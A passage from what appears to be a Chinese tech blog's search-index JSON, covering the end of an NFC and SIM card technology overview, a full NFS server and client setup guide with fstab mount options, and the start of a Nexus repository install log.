14443-4</code>）的模拟卡，要求仅使用 Nfc-A (<code>ISO/IEC 14443-3 Type A</code>) 技术模拟 ISO-DEP，但也可以支持 Nfc-B (<code>ISO/IEC 14443-4 Type B</code>) 技术。</p>\n<p>该标准包含四个部分：</p>\n<ul>\n<li><code>ISO/IEC14443-1</code>:制定了有关非接触卡的物理特性；</li>\n<li><code>ISO/IEC14443-2</code>:制定了有关射频功率及信号界面的特性；</li>\n<li><code>ISO/IEC14443-3</code>:则为非接触卡的初始化及防冲突机制；</li>\n<li><code>ISO/IEC14443-4</code>:位有关的交易协定。</li>\n</ul>\n<p>ISO&#x2F;IEC14443-3 定义了 TYPE A、TYPEB 两种卡型（与飞利浦的 Mifare 标准兼容），均通过13.56Mhz的射频载波传送信号，此外索尼公司开发了FeliCa 标准，也成为TYPE F。<br>不同TYPE的主要的区别在于信号发送的载波调制深度、二进制数编码方式存在差异。<br>此外，防冲突机制的原理也完全不同，TYPE A是基于 BIT 冲突检测协议，TYPE B则是通过字节、帧及命令完成防冲突。</p>\n<h3 id=\"SWP单线协议-Single-Wire-Protocol\"><a href=\"#SWP单线协议-Single-Wire-Protocol\" class=\"headerlink\" title=\"SWP单线协议(Single Wire Protocol)\"></a>SWP单线协议(Single Wire Protocol)</h3><p>手机与普通非接触IC卡最大的不同体现在拥有网络功能和人机交互两部分，因此，NFC手机可以从事传统非接触IC所不能完成的丰富业务，如空中充值、余额查询。所有这些业务均需要一个技术前提即需要一个标准的SIM卡访问接口，能够使得应用客户端访问SIM卡并与SIM卡中的applet进行通信。具体讲，需要在手机中支持三个标准：</p>\n<ol>\n<li><p>SIM Alliance Open Mobile API：为应用客户端提供与SIM卡通信的通道</p>\n</li>\n<li><p>Global Platform&#x2F;GSMA：Secure Element Access Control：授权应用客户端访问SIM卡中对应的applet</p>\n</li>\n<li><p>Modem：需完全支持3GPP 27.007标准，支持打开SIM卡逻辑通道，并能够在逻辑通信上真正实现APDU的透传</p>\n</li>\n</ol>\n<img src=\"/2020/12/30/NFC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/swp.jpg\" class=\"\" title=\"对比分析\">\n\n<p>SWP(Single Wire Protocol)是采用C6引脚的单线连接方案。在SWP方案中，接口界面包括三根线：VCC(C1)、GND(C5)和SWP(C6)，其中SWP一根信号线上基于电压和负载调制原理实现全双工通讯，这样可以实现SIM卡在ISO7816界面定义下同时支持7816和SWP两个接口，并预留了扩展第三个高速(USB)接口的引脚。支持SWP的SIM卡必须同时支持ISO和SWP两个协议栈，需要SIM的COS是多任务的OS系统，并且这两部分需要独立管理的，ISO界面的RST信号不能对SWP部分产生影响。</p>\n<p>　　SWP是在一根单线上实现全双工通讯，定义了S1和S2两个方向的信号， SWP传输的波特率可以从106KBPS最高上升至2MBPS。从SWP的定义看，SWP方案同时满足ISO7816、NFC和大容量高速接口，并且是全双工通讯，可以实现较高波特率。SWP系统地定义了从物理层、链路层到应用层的多层协议，并已经上升成为ETSI的标准，正在争取成为ISO的标准，目前得到业界较多的支持。从另一个角度看，SWP方案要求SIM卡和NFC模拟前端芯片同时重新设计，涉及的面比较广，市场推进的难度较大。另外，NFC应用非常关注掉电模式下的应用，SWP的S2负载调制通讯方式带来接口的功耗损失，对掉电模式下的性能有不利影响。</p>\n<h3 id=\"ISO-IEC-7816\"><a href=\"#ISO-IEC-7816\" class=\"headerlink\" title=\"ISO&#x2F;IEC 7816\"></a>ISO&#x2F;IEC 7816</h3><p>Android处理应用协议数据单元 (APDU)遵循的是<code>ISO/IEC 7816-4</code>规范。</p>\n<p>Android系统上的HCE技术是通过系统服务实现的(HCE服务)。使用服务的一大优势是它可以一直在后台运行而不需要有用户界面。这个特点就使得HCE技术非常适合像会员卡、交通卡、门禁卡这类的交易，当用户使用时无需打开程序，只需要将手机放到NFC读卡器的识别范围内，交易就会在后台进行。当然如果有必要的话，用户也可以打开UI界面。这时的手机和普通的智能卡片已经没有区别了。</p>\n<h4 id=\"服务选择AID\"><a href=\"#服务选择AID\" class=\"headerlink\" title=\"服务选择AID\"></a>服务选择AID</h4><p>交易中我们有一个重要问题需要解决，当用户将手机放到NFC读卡器的识别范围时,Android系统需要知道读卡器真正想要和哪个HCE服务交互，这样它才能将接收到的数据发送至相应的服务。ISO&#x2F;IEC 7816-4规范正是解决服务选择的问题，它定义了一种通过应用程序ID(AID)来选择相应服务的方法。</p>\n<p>一个AID占16位，如果手机模拟的是一个已经存在的NFC读卡设施，那么这些NFC读卡设施会去寻找那些经公共注册而广为人知的AID(类似于端口号)。像Visa卡和万事达卡等这些智能卡可以注册 AID号作为他们专用的识别标志。反之，如果要为自己的新的读卡设施部署NFC应用，你就需要注册自己的AID。AID注册过程在ISO&#x2F;IEC 7816-5规格中定义，为防止和其他的Android程序冲突，Google建议AID号按此规格中推荐的注册。</p>\n<p>当用户将设备接近 NFC 读写器时，Android 系统需要知道 NFC 读写器实际上想要与哪个 HCE 服务对话。这就是<code>ISO/IEC 7816-4</code>规范的来源：它定义了一种以应用程序 ID（AID）为中心的选择应用程序的方法。</p>\n<p>AID 由 16 个字节组成。如果您正在为现有的 NFC 读写器基础设施模拟卡片，这些读者正在寻找的 AID 通常是众所周知的和公开注册的（例如，支付网络的 AID，如 Visa 和 MasterCard）。</p>\n<p>如果您想为自己的应用程序部署新的读取器基础设施，则需要注册您自己的 AID。AID 的注册过程在<code>ISO/IEC 7816-5</code>规范中定义。谷歌建议，如果您正在为 Android 部署 HCE 应用程序，可以按照 7816-5 注册一个 AID，它可避免与其他应用程序发生冲突。</p>\n<h4 id=\"AID组\"><a href=\"#AID组\" class=\"headerlink\" title=\"AID组\"></a>AID组</h4><p>在某些情况下，HCE 服务可能需要注册多个 AID 才能实现某个应用程序，并且需要确保它是所有这些 AID 的默认处理程序（与另一服务的组中的某些 AID 相反）。</p>\n<p>AID 组是一系列被视为属于共同的操作系统 AID 。对于一个 AID 组中的 AID，Android 可以保证以下一项：</p>\n<p>组中的所有 AID 都被路由至此 HCE 服务。<br>组中没有任何 AID 被路由至此 HCE 服务（例如，服务请求组中的一个或多个 AID，而用户优先选择另一服务）。<br>换句话说，不存在中间状态，其中该组中的一些 AID 可以被路由到一个 HCE 服务，而另一些可以路由到另一个 HCE 服务。</p>\n<h4 id=\"AID组和类别\"><a href=\"#AID组和类别\" class=\"headerlink\" title=\"AID组和类别\"></a>AID组和类别</h4><p>每个 AID 组都与一个类别关联。这使得 Android 可以按类别将 HCE 服务分组，并且反过来允许用户在类别级别上设置默认值而不是 AID 级别。通常，避免在应用程序中任何面向用户的部分中提到 AID：它们对普通用户没有任何意义。</p>\n<p>Android 4.4 支持两种类别：<code>CATEGORY_PAYMENT</code>（覆盖行业标准支付应用）和<code>CATEGORY_OTHER</code>（对应于所有其它 HCE 应用）。</p>\n<p>注意：在任何给定时间，在系统中只能启用CATEGORY_PAYMENT类别中的一个 AID 组。通常，这将是一个应用程序，了解主要的信用卡支付协议，可以在任何商家工作。</p>\n<p>对于仅在一个商家（例如储值卡）工作的闭环支付应用，您应该使用CATEGORY_OTHER。该类别中的 AID 组可以总是活动的，并且在必要时可以在 AID 选择期间由 NFC 读写器给予优先级。</p>\n<h2 id=\"超级SIM卡的通信接口\"><a href=\"#超级SIM卡的通信接口\" class=\"headerlink\" title=\"超级SIM卡的通信接口\"></a>超级SIM卡的通信接口</h2><p>通信接口指的是 SIM 卡与外部终端设备进行通信的接口，应支持 ISO7816 和 SWP 两种接口。</p>\n<ul>\n<li>ISO7816 接口是 SIM 卡与外部终端设备进行通信的接触式 I&#x2F;O 接口，遵循 ETSI 102.221 的要求。</li>\n<li>SWP 接口是 SIM 卡与外部非接触终端设备进行通信，实现近场通信相关业务 的物理接口。<br>  超级 SIM 卡支持 SWP 协议，遵循 ETSI TS 102.613 的要求。支持卡 模拟模式、读卡器模式，可选支持点对点传输模式。</li>\n</ul>\n<p>移动终端若支持 NFC 功能，则应支持 SWP 接口，与超级 SIM 卡协同实现刷卡 操作，为用户提供基于非接触感应的线下应用场景。</p>\n<h3 id=\"应用层的技术标准\"><a href=\"#应用层的技术标准\" class=\"headerlink\" title=\"应用层的技术标准\"></a>应用层的技术标准</h3><p>NFC手机可以从事传统非接触IC所不能完成的丰富业务，如空中充值、余额查询。所有这些业务均需要一个技术前提即需要一个标准的SIM卡访问接口，能够使得应用客户端访问SIM卡并与SIM卡中的applet进行通信。具体讲，需要在手机中支持三个标准：</p>\n<ol>\n<li><p>SIM Alliance Open Mobile API：为应用客户端提供与SIM卡通信的通道</p>\n</li>\n<li><p>Global Platform&#x2F;GSMA：Secure Element Access Control：授权应用客户端访问SIM卡中对应的applet</p>\n</li>\n<li><p>Modem：需完全支持3GPP 27.007标准，支持打开SIM卡逻辑通道，并能够在逻辑通信上真正实现APDU的透传</p>\n</li>\n</ol>\n<hr>\n<h2 id=\"附录一：SIM卡的技术标准\"><a href=\"#附录一：SIM卡的技术标准\" class=\"headerlink\" title=\"附录一：SIM卡的技术标准\"></a>附录一：SIM卡的技术标准</h2><p>SIM卡是一个装有微处理器的芯片卡，它的内部有5个模块，并且每个模块都对应一个功能：、</p>\n<ul>\n<li>微处理器CPU（8位）</li>\n<li>程序存储器ROM（3–8kbit）</li>\n<li>工作存储器RAM（6–16kbit）</li>\n<li>数据存储器EEPROM（128–256kbit）</li>\n<li>串行通信单元。</li>\n</ul>\n<img src=\"/2020/12/30/NFC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/sim.jpeg\" class=\"\" title=\"对比分析\">\n\n<p>这5个模块被胶封在SIM卡铜制接口后与普通IC卡封装方式相同。这五个模块必须集成在一块集成电路中，否则其安全性会受到威胁。因为，芯片间的连线可能成为非法存取和盗用SIM卡的重要线索。</p>\n<p>SIM卡同手机连接时至少需要5条连接线（通常编程口未定义）</p>\n<ul>\n<li>数据I&#x2F;O口（Data）</li>\n<li>复位（RST）</li>\n<li>接地端（GND）</li>\n<li>电源（Vcc）</li>\n<li>时钟（CLK）</li>\n</ul>\n<p>如上图所示。</p>\n<p>SIM卡的供电分为5V（1998年前发行）、5V与3V兼容、3V、1.8V等，当然这些卡必须与相应的移动电话机配合使用，即移动电话机产生的SIM卡供电电压与该SIM卡所需的电压相匹配。卡电路中的电源VCC、地GND是卡电路工作的必要条件。卡电源用万用表就可以检测到。SIM卡插入移动电话机后，电源端口提供电源给SIM卡内各模块。</p>\n<h2 id=\"附录二：主流NFC硬件厂商和芯片型号\"><a href=\"#附录二：主流NFC硬件厂商和芯片型号\" class=\"headerlink\" title=\"附录二：主流NFC硬件厂商和芯片型号\"></a>附录二：主流NFC硬件厂商和芯片型号</h2><table>\n<thead>\n<tr>\n<th align=\"center\">射频前端芯片</th>\n<th align=\"center\">读卡器&#x2F;NFC芯片</th>\n<th align=\"center\">卡芯片</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">德州仪器：TI TRF7970A</td>\n<td align=\"center\">恩智浦：NXP PN532</td>\n<td align=\"center\">复旦微电子：FMSH FM1208</td>\n</tr>\n<tr>\n<td align=\"center\">复旦微电子：FMSH FM11NC08S</td>\n<td align=\"center\">恩智浦：NXP PN7150</td>\n<td align=\"center\">华翼微电子 HYm4616A1&#x2F;2&#x2F;3&#x2F;4&#x2F;5&#x2F;6</td>\n</tr>\n<tr>\n<td align=\"center\">-</td>\n<td align=\"center\">意法半导体：ST CR95HF</td>\n<td align=\"center\">华翼微电子： HYm4616A7</td>\n</tr>\n<tr>\n<td align=\"center\">-</td>\n<td align=\"center\">华大电子：HED CIE72D01</td>\n<td align=\"center\">-</td>\n</tr>\n</tbody></table>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://blog.csdn.net/icycityone/article/details/17358357\">NFC-SWP终端架构与标准</a></li>\n<li><a href=\"https://developer.android.com/guide/topics/connectivity/nfc/hce?hl=zh-cn\">Android的NFC官方文档</a></li>\n<li><a href=\"https://www.mpaypass.com.cn/news/201307/12110718.html\">NFC SWP移动支付解决方案技术分析</a></li>\n<li><a href=\"http://tech.rfidworld.com.cn/2010_07/04cd42c1fd6aac1d.html\">近距离通信的SWP方案及其在SIM卡的实现</a></li>\n<li><a href=\"https://blog.csdn.net/xiaoxik/article/details/82156455\">SIM卡详解</a></li>\n<li><a href=\"http://www.jiajuhf.com/zxxw_8/42705634.html\">关于HCE的NFC支付研究报告及其安全性探讨</a></li>\n<li><a href=\"http://article.iotxfd.cn/RFID/Host-based%20card%20emulation\">基于主机的卡模拟概览</a></li>\n<li><a href=\"https://blog.csdn.net/wwww1988600/article/details/69523369\">HCE基础知识普及</a></li>\n<li><a href=\"https://blog.csdn.net/liwei16611/article/details/85209361\">NFC之 Type A 与 TYpe B 卡区别</a></li>\n<li><a href=\"http://www.cmricloud.com/pdf/07/1.pdf\">超级SIM卡的技术白皮书</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s?src=3&timestamp=1625732247&ver=1&signature=YhDcKm20OjT1SqXPV4ZZjLRQtlP42pVugJP77ZqfP6lSnDV7-d-WYWFpxgd-qXkSJ7EwF-g7TpH2pu5MDifsfvGJsEF1yY9jmRZa*elztII6P9xrvmw53XvWBsp-ztpwDYuS4VXwrXgHrA4p4NpNaQ==\">基于HCE移动支付研究报告</a></li>\n<li><a href=\"http://www.nfcin.com.cn/news/201403/11110054.html\">NFC-SWP连接方案在SIM卡中的实现方法</a></li>\n</ul>\n"},{"title":"NFS网络文件共享的安装要点","url":"/2021/12/11/NFS%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E7%9A%84%E5%AE%89%E8%A3%85%E8%A6%81%E7%82%B9/","content":"<p>NFS - Network File System（网络文件系统），是一种基于TCP&#x2F;IP传输的网络文件系统协议，最早由SUN公司研发，通过使用NFS协议，客户机可以像访问本地目录一样，访问远程服务器中的共享资源。<br>NFS 的基本原则是“容许不同的客户端及服务端通过一组RPC分享相同的文件系统”，它是独立于操作系统，容许不同硬件及操作系统的系统共同进行文件的分享。</p>\n<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>NFS在文件传送或信息传送过程中依赖于RPC协议。RPC，远程过程调用 (Remote Procedure Call) 是能使客户端执行其他系统中程序的一种机制。NFS本身是没有提供信息传输的协议和功能的，但NFS却能让我们通过网络进行资料的分享，这是因为NFS使用了一些其它的传输协议。而这些传输协议用到这个RPC功能的。可以说NFS本身就是使用RPC的一个程序。或者说NFS也是一个RPC SERVER。所以只要用到NFS的地方都要启动RPC服务，不论是NFS SERVER或者NFS CLIENT。这样SERVER和CLIENT才能通过RPC来实现PROGRAM PORT的对应。</p>\n<p>可以这么理解RPC和NFS的关系：NFS是一个文件系统，而RPC是负责负责信息的传输。</p>\n<p>目前最新版本是 NFS 4.X，但3.X版本仍然很普遍。</p>\n<p>启用NFS服务器，只需要安装两个软件包<code>nfs-utils</code> 和<code>rpcbind</code>（前身为<code>portmap</code>软件包，任务是提供RPC服务）。<br>由于<code>nfs-utils</code>软件包依赖<code>rpcbind</code>软件，所以使用yum安装时只需要<code>yum install -y nfs-utils</code>就搞定了。</p>\n<p>从NFS服务端的角度看，包含2个核心后台进程：</p>\n<ul>\n<li><code>nfsd</code>：它是基本的NFS守护进程，主要功能是管理客户端是否能够登录服务器；</li>\n<li><code>rpc.mountd</code>：它是RPC安装守护进程，主要功能是管理NFS的文件系统。当客户端顺利通过nfsd登录NFS服务器后，在使用NFS服务所提供的文件前，还必须通过文件使用权限的验证。它会读取NFS的配置文件<code>/etc/exports</code>来对比客户端权限。</li>\n</ul>\n<p>当客户端尝试使用RPC Server所提供的服务时，由于Client需要取得一个可以连接的端口（port）才能够使用RPC Server所提供的服务，因此，客户端首先去请求rpcbind，然后，rpcbind将自己管理的端口映射告知客户端，好让客户端可以连接上服务，因此启动NFS之前，一定要先启动rpcbind。</p>\n<blockquote>\n<p>RPC后台服务占用网络端口111，<code>/etc/services</code>中描述为<code>sunrpc</code>，并有TCP和UDP两种模式。</p>\n</blockquote>\n<p>NFS的常用目录</p>\n<ul>\n<li>&#x2F;etc&#x2F;exports：NFS服务的主要配置文件</li>\n<li>&#x2F;usr&#x2F;sbin&#x2F;exportfs：NFS服务的管理命令</li>\n<li>&#x2F;usr&#x2F;sbin&#x2F;showmount：客户端的查看命令</li>\n<li>&#x2F;var&#x2F;lib&#x2F;nfs&#x2F;etab：记录NFS分享出来的目录的完整权限设定值</li>\n<li>&#x2F;var&#x2F;lib&#x2F;nfs&#x2F;xtab：记录曾经登录过的客户端信息</li>\n</ul>\n<h2 id=\"NFS-Server-安装方法\"><a href=\"#NFS-Server-安装方法\" class=\"headerlink\" title=\"NFS Server 安装方法\"></a>NFS Server 安装方法</h2><h3 id=\"1-Server软件安装\"><a href=\"#1-Server软件安装\" class=\"headerlink\" title=\"1. Server软件安装\"></a>1. Server软件安装</h3><p>安装<code>nfs-utils</code>软件包，并设置系统启动服务<code>rpcbind</code>和<code>nfs</code>。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install -y nfs-utils</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：如果启用了防火墙，需要打开 rpc-bind 和 nfs 的服务</p>\n</blockquote>\n<h3 id=\"2-Server服务配置\"><a href=\"#2-Server服务配置\" class=\"headerlink\" title=\"2. Server服务配置\"></a>2. Server服务配置</h3><p>为加载NFS服务，需要创建一个共享目录。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> /data</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 755 /data</span><br></pre></td></tr></table></figure>\n\n<p>根据这个加载点，在<code>/etc/exports</code>配置导出目录，添加如下行：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">/data/     192.168.0.0/24(rw,sync,no_root_squash,no_all_squash)</span><br></pre></td></tr></table></figure>\n\n<p>主要的配置参数包括：</p>\n<ul>\n<li><code>/data</code>: 共享目录位置。</li>\n<li><code>192.168.0.0/24</code>: 客户端 IP 范围，* 代表所有，即没有限制。</li>\n<li><code>rw</code>: 权限设置，可读可写。</li>\n<li><code>sync|async</code>：&#x3D;sync，数据同步写入到内存与硬盘当中；&#x3D;async，数据会先暂存于内存当中，而非直接写入硬盘</li>\n<li><code>no_root_squash｜root_squash</code>: &#x3D;no_root_squash，如果Client的登录用户是root，则对于这个分享目录的Server来说，他就具有root的权限，也就是不压缩权限！；否则。。。</li>\n<li><code>all_squash｜no_all_squash</code>: &#x3D;all_squash，不论Client的使用者是什么身份，都会被压缩成匿名使用者；否则。。。</li>\n<li><code>anonuid= &amp; anonnid=</code>：当Client登录到分享目录中，在Server其身份是uid:gid。注意，必须在&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;group中存在该ID。</li>\n</ul>\n<blockquote>\n<p>squash：这里是动词 “压缩、压扁”的意思，还有的含义是名词“南瓜、壁球”</p>\n</blockquote>\n<h3 id=\"3-Server启动服务\"><a href=\"#3-Server启动服务\" class=\"headerlink\" title=\"3. Server启动服务\"></a>3. Server启动服务</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"built_in\">enable</span> rpcbind --now</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> nfs --now</span><br><span class=\"line\">systemctl status rpcbind</span><br><span class=\"line\">systemctl status nfs</span><br><span class=\"line\">showmount -e localhost</span><br></pre></td></tr></table></figure>\n\n<p>这样，服务端就配置好了，接下来配置客户端，连接服务端，使用共享目录。</p>\n<h2 id=\"NFS-Client-安装方法\"><a href=\"#NFS-Client-安装方法\" class=\"headerlink\" title=\"NFS Client 安装方法\"></a>NFS Client 安装方法</h2><h3 id=\"1-Client软件安装\"><a href=\"#1-Client软件安装\" class=\"headerlink\" title=\"1. Client软件安装\"></a>1. Client软件安装</h3><p>软件包的名称是<code>nfs-utils</code>，系统服务的名称是<code>rpcbind</code>。</p>\n<blockquote>\n<p>客户端不需要打开防火墙，因为客户端时发出请求方，网络能连接到服务端即可。<br>客户端也不需要开启 NFS 服务，因为不共享目录。</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install -y nfs-utils</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> rpcbind --now</span><br><span class=\"line\">systemctl status rpcbind</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Client服务配置\"><a href=\"#2-Client服务配置\" class=\"headerlink\" title=\"2. Client服务配置\"></a>2. Client服务配置</h3><p>使用<code>showmount</code>命令，查看NFS服务器资源。<br>使用<code>mount</code>命令，手工挂载NFS资源。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@yum ~]<span class=\"comment\"># showmount -e 192.168.0.139</span></span><br><span class=\"line\">Export list <span class=\"keyword\">for</span> 192.168.0.139:</span><br><span class=\"line\">/mnt/HD/HD_a2/NFS *</span><br><span class=\"line\"></span><br><span class=\"line\">[root@yum ~]<span class=\"comment\"># mount 192.168.0.139:/mnt/HD/HD_a2/NFS /mnt</span></span><br><span class=\"line\">[root@yum ~]<span class=\"comment\"># df -h</span></span><br><span class=\"line\">文件系统                         容量  已用  可用 已用% 挂载点</span><br><span class=\"line\">devtmpfs                         486M     0  486M    0% /dev</span><br><span class=\"line\">tmpfs                            496M     0  496M    0% /dev/shm</span><br><span class=\"line\">tmpfs                            496M  6.8M  489M    2% /run</span><br><span class=\"line\">tmpfs                            496M     0  496M    0% /sys/fs/cgroup</span><br><span class=\"line\">/dev/sda1                        8.0G  1.9G  6.2G   24% /</span><br><span class=\"line\">tmpfs                            100M     0  100M    0% /run/user/0</span><br><span class=\"line\">192.168.0.139:/mnt/HD/HD_a2/NFS  3.6T  2.9T  721G   81% /mnt</span><br><span class=\"line\"></span><br><span class=\"line\">[root@yum ~]<span class=\"comment\"># mount</span></span><br><span class=\"line\">sysfs on /sys <span class=\"built_in\">type</span> sysfs (rw,nosuid,nodev,noexec,relatime)</span><br><span class=\"line\">proc on /proc <span class=\"built_in\">type</span> proc (rw,nosuid,nodev,noexec,relatime)</span><br><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\">192.168.0.139:/mnt/HD/HD_a2/NFS on /mnt <span class=\"built_in\">type</span> nfs (rw,relatime,vers=3,rsize=65536,wsize=65536,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,mountaddr=192.168.0.139,mountvers=3,mountport=57811,mountproto=udp,local_lock=none,addr=192.168.0.139)</span><br></pre></td></tr></table></figure>\n\n<p>其中，可以看到NFS的全部默认参数，包括：hard模式，软件版本v3，网络报文大小64K，</p>\n<h3 id=\"3-Client启动服务\"><a href=\"#3-Client启动服务\" class=\"headerlink\" title=\"3. Client启动服务\"></a>3. Client启动服务</h3><p>编辑<code>/etc/fstab</code>文件，设置系统启动时自动加载</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@yum ~]<span class=\"comment\"># more /etc/fstab</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># /etc/fstab</span></span><br><span class=\"line\"><span class=\"comment\"># Created by anaconda on Sun Nov  7 10:03:44 2021</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Accessible filesystems, by reference, are maintained under &#x27;/dev/disk&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">UUID=99f4f882-0886-4b1e-8252-a63e2ffc6cfa /                       xfs     defaults        0 0</span><br><span class=\"line\">192.168.0.139:/mnt/HD/HD_a2/NFS /mnt nfs defaults 0 0</span><br></pre></td></tr></table></figure>\n\n<p>注意：需要重启systemd服务已更新目录配置！！！</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\"><span class=\"built_in\">df</span> -h</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"经验之一：如何处理NFS服务延迟加载问题\"><a href=\"#经验之一：如何处理NFS服务延迟加载问题\" class=\"headerlink\" title=\"经验之一：如何处理NFS服务延迟加载问题\"></a>经验之一：如何处理NFS服务延迟加载问题</h2><p>NFS服务位于独立的WDCLOUD，客户端位于192.168.0.148，全部重启时由于NFS Server尚未完成启动，Client自动加载失败。<br>分析fstab的配置参数：</p>\n<ul>\n<li><code>fg/bg=fg</code>: 设置挂载失败后mount命令的行为<br>  默认为fg，表示挂载失败时将直接报错退出。<br>  如果是bg，挂载失败后会创建一个子进程不断在后台挂载，而父进程mount自身则立即退出并返回0状态码。  </li>\n<li><code>timeo=600</code>: NFS客户端等待下一次重发NFS请求的时间间隔<br>  单位为十分之一秒。默认值&#x3D;600（60秒）</li>\n<li><code>hard/soft=hard</code>: 设置NFS客户端当NFS请求超时时的恢复行为方式<br>  如果是hard，将无限重新发送NFS请求。例如在客户端使用<code>df -h</code>查看文件系统时就会不断等待。<br>  如果是soft，当retrans次数耗尽时，NFS客户端将认为NFS请求失败，从而返回一个错误给调用它的程序。</li>\n<li><code>retrans=3</code>: NFS客户端最多发送的请求次数<br>  NFS客户端最多发送次数耗尽后将报错表示连接失败。如果hard挂载选项生效，则会进一步尝试恢复连接。</li>\n<li><code>rsize,wsize=131072</code>：一次读出(rsize)和写入(wsize)的区块大小。<br>  单位为字节，必须为1024的倍数，且最大只能设置为1M。<br>  Centos 5默认1024，Cenots 6以上默认131072<br>  如果网络带宽大，这两个值设置大一点能提升传输能力。最好设置到带宽的临界值。</li>\n</ul>\n<p>解决办法是：在<code>/etc/fstab</code>中，设置nfs目录的属性为<code>bg</code>，即后台启动。</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">192.168.0.139:/mnt/HD/HD_a2/NFS /data nfs defaults,_netdev,bg 0 0</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://wiki.archlinux.org/title/NFS\">ArchLinux | NFS 官方文档</a></li>\n<li><a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/storage_administration_guide/ch-nfs\">RedHat关于 NFS 的技术文档</a></li>\n<li><a href=\"https://man.archlinux.org/man/mount.8#FILESYSTEM-INDEPENDENT_MOUNT_OPTIONS\">Linux关于 mount 的man官方手册</a></li>\n<li><a href=\"https://docs.aws.amazon.com/zh_cn/efs/latest/ug/mounting-fs-nfs-mount-settings.html\">AWS推荐的 NFS 挂载选项</a></li>\n<li><a href=\"https://www.jianshu.com/p/f85c4371a43d\">Linux 下的 NFS 系统简介</a></li>\n<li><a href=\"https://www.daimajiaoliu.com/daima/4870e3973100414\">linux环境下嵌入式产品的NFS应用</a></li>\n<li><a href=\"https://www.cnblogs.com/mchina/archive/2013/01/03/2840040.html\">Linux NFS服务器的安装与配置</a></li>\n</ul>\n"},{"title":"Nexus私有仓库的安装日志","url":"/2021/02/14/Nexus%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93%E7%9A%84%E5%AE%89%E8%A3%85%E6%97%A5%E5%BF%97/","content":"<h2 id=\"Nexus简介\"><a href=\"#Nexus简介\" class=\"headerlink\" title=\"Nexus简介\"></a>Nexus简介</h2><p>Nexus是一个强大的Maven仓库管理器，它极大地简化了本地内部仓库的维护和外部仓库的访问。 如果使用了公共的Maven仓库服务器，可以从Maven中央仓库下载所需要的构件（Artifact），但这通常不是一个好的做法。<br>正常做法是在本地架设一个Maven仓库服务器，即利用Nexus可以只在一个地方就能够完全控制访问和部署在你所维护仓库中的每个Artifact。 Nexus在代理远程仓库的同时维护本地仓库，以降低中央仓库的负荷,节省外网带宽和时间，Nexus就可以满足这样的需要。<br>Nexus是一套“开箱即用”的系统不需要数据库，它使用文件系统加Lucene来组织数据。<br>Nexus使用ExtJS来开发界面，利用Restlet来提供完整的REST APIs，通过m2eclipse与Eclipse集成使用。<br>Nexus支持WebDAV与LDAP安全身份认证。<br>Nexus还提供了强大的仓库管理功能，构件搜索功能，它基于REST，友好的UI是一个extjs的REST客户端，它占用较少的内存，基于简单文件系统而非数据库。</p>\n<hr>\n<h2 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2><p>必须的硬件条件：</p>\n<ul>\n<li>内存 &gt; 4GB</li>\n<li>可用磁盘空间 &gt; 4GB (建议独立数据磁盘，32G以上）</li>\n<li>已安装JDK8（Maven不是必须的）</li>\n</ul>\n<blockquote>\n<p>Sonatype官方文档宣称必须使用Oracle JDK，但OpenJDK似乎也没问题，但不支持JDK9以上版本</p>\n</blockquote>\n<h2 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h2><ol>\n<li><p>下载nexus软件包，当前版本<code>3.29.2</code>，安装包解压后有两个目录：</p>\n<ul>\n<li>程序目录<code>./nexus-3.29.2-02/</code>， 